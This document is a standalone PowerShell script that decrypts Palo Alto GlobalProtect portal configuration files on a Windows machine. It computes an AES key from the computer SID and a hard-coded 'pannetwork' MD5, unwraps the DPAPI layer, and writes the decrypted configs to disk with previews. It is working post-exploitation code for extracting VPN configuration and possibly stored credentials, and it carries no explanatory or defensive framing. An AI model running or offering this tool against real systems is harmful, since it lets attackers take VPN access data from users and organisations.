Add-Type -AssemblyName System.Security
Add-Type -AssemblyName System.Core

# ── Step 1: Get Computer SID ──────────────────────────────────────────────────
$admin = Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount=True AND SID LIKE 'S-1-5-%-500'"
$computerSID = $admin.SID -replace '-500$', ''
Write-Host "[*] Computer SID: $computerSID"

# ── Step 2: Derive AES key from SID ──────────────────────────────────────────
function ConvertTo-SIDBytes($sidString) {
    $sid = New-Object System.Security.Principal.SecurityIdentifier($sidString)
    $bytes = New-Object byte[] $sid.BinaryLength
    $sid.GetBinaryForm($bytes, 0)
    return $bytes
}

function Get-MD5([byte[]]$data) {
    $md5 = [System.Security.Cryptography.MD5]::Create()
    return $md5.ComputeHash($data)
}

$sidBytes   = ConvertTo-SIDBytes $computerSID
$panMD5     = Get-MD5 ([System.Text.Encoding]::ASCII.GetBytes("pannetwork"))
$combined   = $sidBytes + $panMD5
$md5Key     = Get-MD5 $combined
$aesKey     = $md5Key + $md5Key   # 32 bytes → AES-256

Write-Host "[*] Derived AES key: $(($aesKey | ForEach-Object { $_.ToString('X2') }) -join '')"

# ── Step 3: Decrypt all DPAPI-stripped _clear.xml files ──────────────────────
function Invoke-AESDecrypt([byte[]]$ciphertext, [byte[]]$key) {
    $aes          = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode     = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding  = [System.Security.Cryptography.PaddingMode]::None
    $aes.KeySize  = 256
    $aes.Key      = $key
    $aes.IV       = New-Object byte[] 16   # null IV

    $decryptor = $aes.CreateDecryptor()
    $plaintext = $decryptor.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
    $aes.Dispose()

    # Strip PKCS7 padding manually
    $padLen = $plaintext[-1]
    if ($padLen -ge 1 -and $padLen -le 16) {
        $plaintext = $plaintext[0..($plaintext.Length - $padLen - 1)]
    }
    return $plaintext
}

$searchPath = Join-Path $env:USERPROFILE "AppData\Local\Palo Alto Networks\GlobalProtect"

# Process _clear.xml files (already DPAPI-stripped)
Get-ChildItem -Path $searchPath -Filter "PanPortalCfg_*_clear.xml" | ForEach-Object {
    $inputFile  = $_.FullName
    $outputFile = $inputFile -replace '_clear\.xml$', '_decrypted.xml'

    try {
        $ciphertext = [System.IO.File]::ReadAllBytes($inputFile)
        $plaintext  = Invoke-AESDecrypt $ciphertext $aesKey

        # Detect encoding (UTF-16LE BOM FF FE or UTF-8)
        if ($plaintext[0] -eq 0xFF -and $plaintext[1] -eq 0xFE) {
            $text = [System.Text.Encoding]::Unicode.GetString($plaintext)
        } else {
            $text = [System.Text.Encoding]::UTF8.GetString($plaintext)
        }

        [System.IO.File]::WriteAllText($outputFile, $text, [System.Text.Encoding]::UTF8)
        Write-Host "[OK] Decrypted: $($_.Name) -> $outputFile"
        Write-Host "[*]  Preview  : $($text.Substring(0, [Math]::Min(200, $text.Length)))"
    } catch {
        Write-Host "[FAIL] $($_.Name): $_"
    }
}

# Optionally also handle raw .dat files (DPAPI + AES in one shot)
Get-ChildItem -Path $searchPath -Filter "PanPortalCfg_*.dat" | ForEach-Object {
    $inputFile  = $_.FullName
    $outputFile = Join-Path $_.DirectoryName ($_.BaseName + "_decrypted.xml")

    try {
        $bytes = [System.IO.File]::ReadAllBytes($inputFile)

        # DPAPI layer
        try {
            $aesCtx = [System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine)
        } catch {
            $aesCtx = [System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
        }

        # AES layer
        $plaintext = Invoke-AESDecrypt $aesCtx $aesKey

        if ($plaintext[0] -eq 0xFF -and $plaintext[1] -eq 0xFE) {
            $text = [System.Text.Encoding]::Unicode.GetString($plaintext)
        } else {
            $text = [System.Text.Encoding]::UTF8.GetString($plaintext)
        }

        [System.IO.File]::WriteAllText($outputFile, $text, [System.Text.Encoding]::UTF8)
        Write-Host "[OK] Decrypted: $($_.Name) -> $outputFile"
        Write-Host "[*]  Preview  : $($text.Substring(0, [Math]::Min(200, $text.Length)))"
    } catch {
        Write-Host "[FAIL] $($_.Name): $_"
    }
}
